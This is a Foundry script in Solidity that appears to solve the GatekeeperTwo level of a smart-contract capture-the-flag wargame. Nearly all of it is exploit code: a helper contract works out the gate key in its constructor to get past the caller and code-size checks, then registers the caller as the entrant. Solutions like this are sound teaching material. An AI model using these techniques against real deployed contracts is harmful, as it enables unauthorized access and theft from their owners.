// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console2} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/14_GatekeeperTwo.sol";

contract Mallicious {
	constructor(address _target) {
		bytes8 gateKey = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max );
		GatekeeperTwo(_target).enter(gateKey);
	}
}

contract Exploit is Script {
	function run() public {
		vm.startBroadcast();
		address target = vm.envAddress("INSTANCE");
		address myAddr = vm.envAddress("MY_ADDR");

		// deploy and attack
		console2.log("My Address: ", myAddr);
		Mallicious attacker = new Mallicious(target);

		// verify
		GatekeeperTwo gatekeeper = GatekeeperTwo(target);
		require(myAddr == gatekeeper.entrant(), "Exploit failed");
		console2.log("Success! We managed to register ourselve as the entrant!");

		vm.stopBroadcast();
	}
}
